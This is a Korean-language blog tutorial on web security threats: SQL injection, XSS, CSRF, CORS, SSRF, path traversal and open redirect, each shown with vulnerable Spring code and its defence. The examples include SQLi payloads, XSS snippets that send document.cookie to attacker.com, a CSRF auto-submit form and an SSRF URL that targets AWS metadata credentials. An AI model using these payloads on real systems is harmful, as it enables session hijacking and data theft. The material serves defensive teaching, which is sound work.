---
title: "[인증과 보안] 4편 — 웹 보안 공격과 방어: 실전 위협 모델"
date: 2026-03-17T22:04:00+09:00
draft: false
tags: ["SQL Injection", "XSS", "CSRF", "CORS", "보안", "서버"]
series: ["인증과 보안"]
summary: "SQL Injection 원리와 방어(PreparedStatement, ORM), XSS(Reflected/Stored/DOM)와 CSP, CSRF와 SameSite 쿠키, CORS 동작 원리, SSRF·Path Traversal·Open Redirect까지"
---

보안 취약점은 코드 리뷰나 테스트에서 쉽게 잡히지 않는다. 기능은 정상 동작하지만 공격자가 의도한 경로로 진입하면 데이터베이스가 통째로 유출되고, 사용자 세션이 탈취되며, 서버가 내부 네트워크를 탐색하는 도구가 된다. 이 글은 웹 애플리케이션에서 가장 빈번하게 발생하는 공격 유형들을 원리부터 이해하고, 실제 코드 수준에서 방어하는 방법을 다룬다. 이론적 설명보다 "왜 이 코드가 뚫리는가"와 "정확히 어디서 막아야 하는가"에 집중한다.

---

## 1. SQL Injection

### 원리: 쿼리와 데이터의 경계 붕괴

SQL Injection은 사용자 입력이 SQL 쿼리의 **구조** 자체를 변형할 수 있을 때 발생한다. 애플리케이션이 문자열 연결로 쿼리를 조립하면, 입력값 안에 포함된 SQL 문법이 그대로 실행된다.

```java
// 취약한 코드 — 절대 이렇게 쓰지 말 것
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

공격자가 `username`에 `admin' --`를 입력하면 최종 쿼리는 다음과 같다.

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```

`--`는 SQL 주석이므로 패스워드 검증이 완전히 생략된다. 더 나아가 `' OR '1'='1`을 입력하면 WHERE 절이 항상 참이 되어 전체 레코드가 반환된다.

### UNION 기반 데이터 추출

```sql
-- 공격자 입력: ' UNION SELECT table_name, null FROM information_schema.tables --
SELECT name, email FROM users WHERE id = '' UNION SELECT table_name, null FROM information_schema.tables --'
```

이 쿼리는 데이터베이스의 모든 테이블 이름을 반환한다. 구조를 파악한 다음에는 실제 민감 데이터를 추출하는 것이 trivial하다.

### Blind SQL Injection

에러 메시지가 노출되지 않아도 응답의 차이(참/거짓)나 응답 시간으로 데이터를 추론할 수 있다.

```sql
-- Boolean-based blind
' AND SUBSTRING(password, 1, 1) = 'a' --

-- Time-based blind (MySQL)
' AND IF(1=1, SLEEP(5), 0) --
```

서버가 침묵해도 5초 지연이 발생하면 조건이 참임을 알 수 있다. 자동화 도구(sqlmap)를 사용하면 수천 번의 요청으로 전체 데이터베이스를 추출한다.

### 방어: PreparedStatement

```java
// 올바른 방어 — PreparedStatement
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

PreparedStatement는 쿼리 구조를 먼저 컴파일한 뒤 파라미터를 **데이터**로만 바인딩한다. `admin' --`를 입력해도 SQL 문법으로 해석되지 않고 리터럴 문자열로 처리된다. 이것이 SQL Injection을 원천 차단하는 유일한 근본 해결책이다.

### ORM 사용 시 주의점

Spring Data JPA나 MyBatis를 쓴다고 자동으로 안전한 것은 아니다.

```java
// JPA — 안전 (파라미터 바인딩)
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// JPA — 취약 (문자열 연결)
@Query("SELECT u FROM User u WHERE u.username = '" + username + "'")
User findByUsername(String username);
```

```xml
<!-- MyBatis — 안전 (#은 PreparedStatement 사용) -->
<select id="findUser" resultType="User">
  SELECT * FROM users WHERE username = #{username}
</select>

<!-- MyBatis — 취약 ($는 문자열 치환, ORDER BY 등 동적 컬럼명에만 사용) -->
<select id="findUser" resultType="User">
  SELECT * FROM users WHERE username = '${username}'
</select>
```

MyBatis에서 `${}` 문법은 동적 테이블명이나 컬럼명처럼 파라미터 바인딩이 불가능한 경우에만, 화이트리스트 검증을 거친 후 사용한다.

### 추가 방어 계층

- **최소 권한 원칙**: 애플리케이션 DB 계정에 `SELECT`, `INSERT`, `UPDATE`만 부여. `DROP`, `CREATE`, `FILE` 권한은 절대 불허.
- **에러 메시지 숨김**: DB 에러를 사용자에게 노출하지 않는다. 공격자에게 DB 구조 정보를 제공한다.
- **WAF**: 추가 방어층이지만 우회 가능하므로 코드 수준 방어를 대체할 수 없다.

---

## 2. XSS (Cross-Site Scripting)

### 원리: 신뢰받은 사이트에서 악성 스크립트 실행

XSS는 공격자가 삽입한 스크립트가 피해자의 브라우저에서 **해당 사이트의 권한으로** 실행되는 취약점이다. 세션 쿠키 탈취, 키로깅, DOM 조작, 피싱 페이지 삽입이 모두 가능하다.

### Reflected XSS

서버가 요청 파라미터를 즉시 응답에 반영할 때 발생한다.

```java
// 취약한 Spring MVC 컨트롤러
@GetMapping("/search")
@ResponseBody
public String search(@RequestParam String q) {
    return "<h1>검색 결과: " + q + "</h1>";
}
```

공격자가 다음 URL을 피해자에게 전송한다.

```
https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

피해자가 링크를 클릭하면 브라우저가 스크립트를 실행해 쿠키를 공격자 서버로 전송한다.

### Stored XSS

악성 스크립트가 데이터베이스에 저장되어 다른 사용자가 해당 콘텐츠를 로드할 때마다 실행된다. 댓글, 게시글, 프로필 정보 등이 주요 경로다.

```
댓글 내용: 좋은 글이네요! <script>fetch('https://attacker.com/'+document.cookie)</script>
```

Stored XSS는 Reflected XSS보다 훨씬 위험하다. 링크 클릭 없이 페이지 방문만으로 모든 방문자가 피해를 입는다.

### DOM-based XSS

서버를 거치지 않고 클라이언트 사이드 JavaScript가 URL 파라미터를 직접 DOM에 삽입할 때 발생한다.

```javascript
// 취약한 클라이언트 코드
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML = '안녕하세요, ' + name + '!';
```

`innerHTML`은 HTML 파싱을 수행하므로 스크립트 태그가 실행된다. 서버 응답에는 악성 코드가 없어 서버 측 필터를 우회한다.

### 방어: 출력 인코딩

XSS의 근본 방어는 **컨텍스트에 맞는 출력 인코딩**이다.

```java
// Thymeleaf — th:text는 자동으로 HTML 인코딩
<p th:text="${userInput}"><!-- & → &amp;, < → &lt; --></p>

// th:utext는 raw HTML 출력 — 사용 금지 (꼭 필요하면 sanitizer 적용 후)
<p th:utext="${sanitizedContent}"></p>
```

```java
// Spring에서 OWASP Java HTML Sanitizer 사용
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userInput);
```

```javascript
// DOM 조작 시 textContent 사용 (innerHTML 사용 금지)
document.getElementById('greeting').textContent = '안녕하세요, ' + name + '!';

// 꼭 HTML을 삽입해야 한다면 DOMPurify 사용
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

컨텍스트별 인코딩이 중요하다. HTML 속성, JavaScript, CSS, URL 각각에 필요한 인코딩 방식이 다르다. OWASP의 `ESAPI`나 각 프레임워크의 내장 이스케이핑 기능을 사용하면 컨텍스트를 자동으로 처리한다.

### Content Security Policy (CSP)

CSP는 브라우저가 실행할 수 있는 리소스의 출처를 제한하는 HTTP 헤더다. XSS 공격이 성공하더라도 외부 서버로의 데이터 전송이나 인라인 스크립트 실행을 차단한다.

```java
// Spring Security CSP 설정
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self' 'nonce-{random}'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data:; " +
                    "connect-src 'self'; " +
                    "frame-ancestors 'none'; " +
                    "report-uri /csp-report"
                )
            )
        );
        return http.build();
    }
}
```

주요 디렉티브:
- `default-src 'self'`: 모든 리소스를 동일 출처에서만 허용
- `script-src 'nonce-{random}'`: 서버가 생성한 난수를 가진 스크립트만 실행
- `frame-ancestors 'none'`: Clickjacking 방지
- `report-uri`: 위반 시도를 서버로 보고 (모니터링용)

`unsafe-inline`과 `unsafe-eval`은 CSP를 사실상 무력화하므로 사용하지 않는다. Nonce 기반 또는 hash 기반 방식으로 인라인 스크립트를 허용한다.

---

## 3. CSRF (Cross-Site Request Forgery)

### 원리: 사용자의 인증된 요청을 위조

CSRF는 피해자가 인증된 상태에서 공격자가 의도한 요청을 **사용자 모르게** 전송하게 만드는 공격이다. 브라우저가 요청 시 쿠키를 자동으로 첨부하는 특성을 악용한다.

```html
<!-- 공격자의 악성 페이지 -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker_account" />
      <input type="hidden" name="amount" value="1000000" />
    </form>
  </body>
</html>
```

피해자가 은행에 로그인한 상태에서 이 페이지를 방문하면, 브라우저가 자동으로 은행 세션 쿠키를 첨부해 이체 요청을 전송한다. 서버는 유효한 세션을 가진 정상적인 요청으로 인식한다.

### CSRF 토큰

서버가 생성한 예측 불가능한 토큰을 각 폼에 삽입하고, 요청 시 이를 검증한다. 공격자는 다른 출처에서 이 토큰 값을 알 수 없다.

```java
// Spring Security는 기본으로 CSRF 보호 활성화
// Thymeleaf와 함께 사용 시 _csrf 토큰 자동 삽입
<form th:action="@{/transfer}" method="post">
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
    <!-- 폼 필드들 -->
</form>
```

REST API에서는 헤더 기반으로 토큰을 전달한다.

```javascript
// AJAX 요청 시 CSRF 토큰을 헤더에 포함
const csrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': csrfToken
    },
    body: JSON.stringify({ to: 'account', amount: 1000 })
});
```

```java
// Spring Security REST API CSRF 설정
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // JavaScript가 쿠키에서 토큰을 읽을 수 있도록 HttpOnly=false
);
```

### SameSite 쿠키

`SameSite` 속성은 크로스 사이트 요청에서 쿠키 전송을 제어한다. CSRF에 대한 현대적이고 효과적인 방어책이다.

```java
// Spring Boot에서 SameSite 설정
@Bean
public CookieSameSiteSupplier applicationCookieSameSiteSupplier() {
    return CookieSameSiteSupplier.ofStrict();
}
```

또는 application.properties에서:
```properties
server.servlet.session.cookie.same-site=strict
```

| SameSite 값 | 동작 |
|-------------|------|
| `Strict` | 크로스 사이트 요청에서 쿠키 전혀 전송 안 함. 가장 강력하지만 외부 링크 클릭 후 로그인 유지가 안 됨 |
| `Lax` | GET 요청(탑 레벨 네비게이션)에는 쿠키 전송, POST 등 상태 변경 요청에는 차단. 기본값으로 권장 |
| `None` | 크로스 사이트 요청에도 쿠키 전송. `Secure` 속성과 함께 사용 필수. CSRF에 취약 |

`SameSite=Lax`는 현대 브라우저의 기본값이지만 명시적으로 설정하는 것이 안전하다. CSRF 토큰과 SameSite 쿠키를 함께 적용하면 방어 심도가 높아진다.

### SPA와 CSRF

쿠키 기반 세션 대신 `Authorization: Bearer {token}` 헤더로 인증하는 SPA는 CSRF에 취약하지 않다. 브라우저가 자동으로 Authorization 헤더를 추가하지 않기 때문이다. 단, 토큰을 `localStorage`에 저장하면 XSS 취약점이 생기므로 트레이드오프를 고려해야 한다.

---

## 4. CORS (Cross-Origin Resource Sharing)

### 동일 출처 정책(SOP)과 CORS의 필요성

브라우저는 기본적으로 **Same-Origin Policy**를 적용한다. `https://app.example.com`의 JavaScript는 `https://api.example.com`에 직접 요청할 수 없다. 출처(scheme + host + port)가 다르기 때문이다.

CORS는 서버가 특정 출처의 크로스 도메인 요청을 허용할 수 있도록 브라우저에 알려주는 메커니즘이다.

### Preflight 요청 흐름

단순 요청(GET, HEAD, POST with 특정 Content-Type)이 아닌 경우, 브라우저는 실제 요청 전에 `OPTIONS` preflight 요청을 보내 서버의 허용 여부를 확인한다.

```
[브라우저] OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Content-Type, Authorization

[서버 응답]
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

`Access-Control-Max-Age`는 preflight 결과를 캐시하는 시간(초)으로, 매 요청마다 OPTIONS를 보내지 않아도 된다.

### Spring에서 CORS 설정

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.example.com", "https://admin.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
            .allowedHeaders("Content-Type", "Authorization")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

Spring Security와 함께 사용할 때는 CORS 설정을 Spring Security 필터 체인에도 등록해야 한다.

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        // ...
    return http.build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Content-Type", "Authorization"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}
```

### 잘못된 CORS 설정의 위험성

**안티패턴 1: 와일드카드 + 자격증명**

```java
// 이 조합은 브라우저가 거부하지만, 일부 개발자가 우회하려 더 큰 구멍을 만든다
config.setAllowedOrigins(List.of("*"));
config.setAllowCredentials(true); // 오류 발생
```

`allowCredentials(true)`와 `allowedOrigins("*")`의 조합은 브라우저 스펙상 허용되지 않는다. 그런데 이를 해결하려고 `allowedOriginPatterns("*")`를 사용하면 모든 출처에 자격증명 요청을 허용하게 되어 CSRF와 동등한 취약점이 생긴다.

**안티패턴 2: Origin 헤더 단순 반영**

```java
// 절대 금지
String origin = request.getHeader("Origin");
response.setHeader("Access-Control-Allow-Origin", origin); // 공격자 도메인도 허용됨
response.setHeader("Access-Control-Allow-Credentials", "true");
```

공격자가 Origin 헤더를 자신의 도메인으로 설정하면 서버가 그대로 반영해 모든 크로스 오리진 요청을 허용한다. 허용 목록(allowlist)을 코드에 하드코딩하고 요청 Origin이 목록에 있는지 검증해야 한다.

**안티패턴 3: 와일드카드 서브도메인의 위험성**

```java
config.setAllowedOriginPatterns(List.of("https://*.example.com"));
```

`https://evil.example.com`도 허용된다. 서브도메인을 완전히 통제할 수 없다면 명시적으로 허용 목록을 관리해야 한다.

### CORS는 서버 보안이 아니다

CORS는 **브라우저**가 강제하는 정책이다. `curl`이나 Postman, 서버 간 통신에는 적용되지 않는다. CORS를 설정했다고 API 자체가 보호받는 것이 착각이다. 인증/인가는 CORS와 별개로 반드시 구현해야 한다.

---

## 5. SSRF, Path Traversal, Open Redirect

### SSRF (Server-Side Request Forgery)

서버가 사용자 입력으로 외부 URL에 요청을 보낼 때 발생한다. 공격자는 외부 URL 대신 내부 네트워크 주소를 지정해 서버를 내부 탐색 도구로 활용한다.

```java
// 취약한 코드 — 외부 이미지 프록시
@GetMapping("/proxy")
public ResponseEntity<byte[]> proxy(@RequestParam String url) throws Exception {
    URL targetUrl = new URL(url);
    byte[] content = targetUrl.openStream().readAllBytes();
    return ResponseEntity.ok(content);
}
```

공격자가 `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`를 전달하면 AWS EC2 메타데이터에서 IAM 자격증명을 탈취할 수 있다. 내부 서비스(`http://internal-db:5432`)나 Kubernetes API(`http://kubernetes.default.svc`)에도 접근 가능하다.

**방어:**

```java
@Service
public class SafeHttpClient {

    private static final List<String> ALLOWED_HOSTS = List.of(
        "images.example.com",
        "cdn.trusted-partner.com"
    );

    public byte[] fetchExternalResource(String urlStr) throws Exception {
        URL url = new URL(urlStr);

        // 1. 허용된 호스트 화이트리스트 검증
        if (!ALLOWED_HOSTS.contains(url.getHost())) {
            throw new SecurityException("허용되지 않은 호스트: " + url.getHost());
        }

        // 2. 스키마 검증 (file://, gopher:// 등 차단)
        if (!url.getProtocol().equals("https")) {
            throw new SecurityException("HTTPS만 허용됩니다");
        }

        // 3. IP 주소 직접 사용 차단 (호스트명 해석 후 검증)
        InetAddress address = InetAddress.getByName(url.getHost());
        if (address.isLoopbackAddress() || address.isSiteLocalAddress()
                || address.isLinkLocalAddress()) {
            throw new SecurityException("내부 IP 주소는 허용되지 않습니다");
        }

        // 4. 실제 요청
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(3000);
        conn.setReadTimeout(5000);
        return conn.getInputStream().readAllBytes();
    }
}
```

DNS rebinding 공격(화이트리스트 통과 후 IP가 내부 주소로 변경)을 막으려면 IP 검증을 DNS 조회 시점이 아닌 실제 연결 시점에 수행하는 것이 중요하다. 가능하면 별도의 격리된 네트워크에서 외부 요청을 처리하는 아키텍처를 고려한다.

### Path Traversal (Directory Traversal)

파일 경로를 사용자 입력으로 구성할 때 `../`를 이용해 의도된 디렉토리 밖의 파일에 접근할 수 있다.

```java
// 취약한 코드
@GetMapping("/files/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) throws Exception {
    Path filePath = Paths.get("/app/uploads/" + filename);
    Resource resource = new FileSystemResource(filePath);
    return ResponseEntity.ok(resource);
}
```

`filename`에 `../../etc/passwd`를 전달하면 서버의 `/etc/passwd`를 읽는다. URL 인코딩(`%2e%2e%2f`)이나 중복 인코딩(`%252e%252e%252f`)으로 필터를 우회할 수도 있다.

**방어:**

```java
@GetMapping("/files/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) throws Exception {
    // 기준 디렉토리를 정규화된 절대 경로로 설정
    Path baseDir = Paths.get("/app/uploads").toRealPath();

    // 요청된 경로를 정규화
    Path requestedPath = baseDir.resolve(filename).normalize();

    // 정규화 후에도 기준 디렉토리 내에 있는지 검증
    if (!requestedPath.startsWith(baseDir)) {
        throw new SecurityException("허용되지 않은 파일 경로");
    }

    // 파일 존재 여부 확인 후 반환
    if (!Files.exists(requestedPath) || !Files.isRegularFile(requestedPath)) {
        return ResponseEntity.notFound().build();
    }

    Resource resource = new FileSystemResource(requestedPath);
    return ResponseEntity.ok(resource);
}
```

`normalize()`는 `../`를 제거하고, `startsWith(baseDir)` 검증으로 경계를 벗어나는 접근을 차단한다. `toRealPath()`는 심볼릭 링크도 해석해 실제 물리 경로를 반환한다.

### Open Redirect

서버가 사용자 입력을 그대로 리다이렉트 대상으로 사용할 때, 공격자는 신뢰받은 도메인을 경유해 피싱 사이트로 사용자를 유도한다.

```java
// 취약한 코드
@GetMapping("/login")
public String login(@RequestParam String redirectUrl, ...) {
    // 로그인 처리 후
    return "redirect:" + redirectUrl; // 공격자가 지정한 URL로 이동
}
```

공격자는 다음 링크를 이메일로 전송한다.

```
https://bank.com/login?redirectUrl=https://evil-bank.com/phishing
```

사용자는 bank.com 도메인의 링크를 신뢰하고 클릭한다. 로그인 후 피싱 사이트로 이동한다.

**방어:**

```java
@Service
public class RedirectValidator {

    private static final List<String> ALLOWED_REDIRECT_URLS = List.of(
        "/dashboard",
        "/profile",
        "/settings"
    );

    public String validateAndGetRedirectUrl(String requestedUrl) {
        // 방법 1: 화이트리스트 — 허용된 경로만 허용
        if (ALLOWED_REDIRECT_URLS.contains(requestedUrl)) {
            return requestedUrl;
        }

        // 방법 2: 상대 경로만 허용
        try {
            URI uri = new URI(requestedUrl);
            if (uri.isAbsolute()) {
                // 절대 URL은 허용하지 않음
                return "/dashboard";
            }
            // 상대 경로는 허용 (단, //로 시작하는 프로토콜 상대 URL 차단)
            if (requestedUrl.startsWith("//")) {
                return "/dashboard";
            }
            return requestedUrl;
        } catch (URISyntaxException e) {
            return "/dashboard";
        }
    }
}
```

`//evil.com` 형태의 프로토콜 상대 URL도 브라우저가 외부 도메인으로 해석하므로 반드시 차단한다. 가장 안전한 방법은 리다이렉트 URL을 서버 사이드에서만 결정하고 사용자 입력을 받지 않는 것이다.

---

## 6. 실전 보안 설계 원칙

### 입력 검증과 출력 인코딩의 분리

- **입력 검증**: 데이터가 기대하는 형식인지 확인 (화이트리스트 기반)
- **출력 인코딩**: 데이터를 삽입하는 컨텍스트에 맞게 인코딩

입력 검증만으로 XSS를 막으려는 것은 불완전하다. 공격자는 다양한 인코딩과 우회 기법을 사용한다. 출력 시점에 컨텍스트에 맞는 인코딩이 필수다.

### 심층 방어 (Defense in Depth)

단일 방어선에 의존하지 않는다.

```
SQL Injection: PreparedStatement + 최소 권한 + WAF
XSS: 출력 인코딩 + CSP + HttpOnly 쿠키
CSRF: CSRF 토큰 + SameSite 쿠키 + 출처 검증
CORS: 명시적 허용 목록 + 인증/인가 분리
SSRF: 화이트리스트 + 네트워크 격리 + IP 검증
```

### 보안 헤더 체크리스트

```java
http.headers(headers -> headers
    .frameOptions(frame -> frame.deny())                    // Clickjacking 방지
    .xssProtection(xss -> xss.disable())                    // CSP 사용 시 불필요 (레거시)
    .contentTypeOptions(Customizer.withDefaults())          // MIME 스니핑 방지
    .httpStrictTransportSecurity(hsts -> hsts               // HTTPS 강제
        .includeSubDomains(true)
        .maxAgeInSeconds(31536000))
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; frame-ancestors 'none'"))
    .referrerPolicy(referrer -> referrer
        .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

보안은 기능을 다 구현한 후에 추가하는 것이 아니라, 설계 단계부터 고려해야 한다. 위협 모델링(STRIDE 등)으로 시스템의 공격 표면을 미리 파악하고, 각 위협에 대한 대응책을 아키텍처에 반영하는 것이 올바른 순서다.

---

## 참고 자료

- [OWASP Top Ten](https://owasp.org/www-project-top-ten/) — 웹 보안 취약점 상위 10가지 공식 분류 및 상세 설명
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — SQL Injection, XSS, CSRF, CORS 등 각 취약점별 방어 가이드라인
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — 실습 기반 웹 보안 취약점 학습 플랫폼
- [Spring Security Reference — CORS](https://docs.spring.io/spring-security/reference/servlet/integrations/cors.html) — Spring Security 공식 CORS 설정 문서
- [MDN Web Docs — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — CSP 지시어 상세 레퍼런스
- [Google — SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) — SSRF 방어 전략 및 구현 패턴
